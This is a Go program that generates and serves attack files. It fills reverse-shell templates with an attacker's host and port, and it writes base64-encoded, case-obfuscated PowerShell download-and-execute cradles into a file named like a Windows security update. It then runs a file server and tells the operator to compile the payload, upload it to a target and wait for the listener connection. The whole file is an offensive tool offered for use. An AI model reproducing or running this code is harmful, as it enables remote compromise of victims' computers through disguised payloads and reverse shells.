package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

func loggingFileServer(w http.ResponseWriter, r *http.Request, fileServer http.Handler) {
	log.Printf("%s %s %s\n", r.RemoteAddr, r.Method, r.URL)
	fileServer.ServeHTTP(w, r)
}

func main() {

	reader := bufio.NewReader(os.Stdin)

	// 1st IP — HTTP Server (port 8000)
	fmt.Print("[?] Enter IP/Domain for Python HTTP server (port 8000): ")
	serverHostInput, _ := reader.ReadString('\n')
	SERVER_HOST := strings.TrimSpace(serverHostInput)

	// 2nd IP — Reverse Shell Listener
	fmt.Print("[?] Enter IP/Domain for Reverse Shell listener: ")
	lhostInput, _ := reader.ReadString('\n')
	LHOST := strings.TrimSpace(lhostInput)

	// 2nd Port — Reverse Shell Listener Port
	fmt.Print("[?] Enter PORT for Reverse Shell listener: ")
	lportInput, _ := reader.ReadString('\n')
	LPORT := strings.TrimSpace(lportInput)

	// Basic validation
	if SERVER_HOST == "" || LHOST == "" || LPORT == "" {
		fmt.Println("[!] Error: IP/Domain and PORT must be provided.")
		return
	}

	fmt.Println("******************************************")
	fmt.Println("SERVER_HOST (Python server): ", SERVER_HOST)
	fmt.Println("LHOST       (Reverse shell): ", LHOST)
	fmt.Println("LPORT       (Reverse shell): ", LPORT)
	fmt.Println("******************************************")

	// ---------------------------------------------------------------
	// Modify "update_script.template" — SERVER_HOST
	// ---------------------------------------------------------------
	updateScript, err := os.ReadFile("update_script.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	updateScriptStr := string(updateScript)
	modifiedUpdateScript := strings.ReplaceAll(updateScriptStr, "ServerHostHere", SERVER_HOST)

	err = os.WriteFile("update_script.go", []byte(modifiedUpdateScript), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	// ---------------------------------------------------------------
	// Modify "r1.template"
	//   XXXXX        → LHOST (IP)
	//   InfinityTest → LPORT (Port)
	// ---------------------------------------------------------------
	r1, err := os.ReadFile("r1.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	r1Str := string(r1)

	// XXXXX → IP (LHOST)
	r1Modified := strings.ReplaceAll(r1Str, "XXXXX", LHOST)

	// InfinityTest → Port (LPORT)
	r1Modified = strings.ReplaceAll(r1Modified, "InfinityTest", LPORT)

	err = os.WriteFile("r1", []byte(r1Modified), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	// ---------------------------------------------------------------
	// Modify "WinSecUp.template" — A1BASE64 (SERVER_HOST theke a1)
	// ---------------------------------------------------------------
	WinSecUpdate, err := os.ReadFile("WinSecUp.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	WinSecUpdateStr := string(WinSecUpdate)

	a1PowerShell := "InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://" + SERVER_HOST + "/a1')"
	a1Encoded := base64.StdEncoding.EncodeToString([]byte(a1PowerShell))

	WinSecUpdateA1Modified := strings.ReplaceAll(WinSecUpdateStr, "A1BASE64", a1Encoded)

	err = os.WriteFile("WinSecUp", []byte(WinSecUpdateA1Modified), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	// ---------------------------------------------------------------
	// Modify "WinSecUp" — R1BASE64 (SERVER_HOST theke r1)
	// ---------------------------------------------------------------
	WinSecUpdate2, err := os.ReadFile("WinSecUp")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	WinSecUpdateStr2 := string(WinSecUpdate2)

	r1PowerShell := "InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://" + SERVER_HOST + "/r1')"
	r1Encoded := base64.StdEncoding.EncodeToString([]byte(r1PowerShell))

	WinSecUpdateA1Modified2 := strings.ReplaceAll(WinSecUpdateStr2, "R1BASE64", r1Encoded)

	err = os.WriteFile("WinSecUp", []byte(WinSecUpdateA1Modified2), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("******************************************")
	fmt.Printf("[!] Start your listener on port %s\n", LPORT)
	fmt.Printf("[!] Press ENTER to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')

	prompt := `
******************************************
[!] Attack files have been generated
******************************************
[-] update_script.go
[-] r1
[-] WinSecUp

******************************************
[!] HTTP Server is running on port 8000
[!] Press CTRL+C to Exit

******************************************`

	fmt.Println(prompt)

	fileServer := http.FileServer(http.Dir("./"))

	var handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		loggingFileServer(w, r, fileServer)
	})

	http.Handle("/", handler)

	fmt.Println("[!] Compile and Upload 'update_script.exe' to target and execute")
	fmt.Println("[!] Check Listener for connection\n")
	fmt.Println("******************************************")

	log.Fatal(http.ListenAndServe(":8000", nil))
}
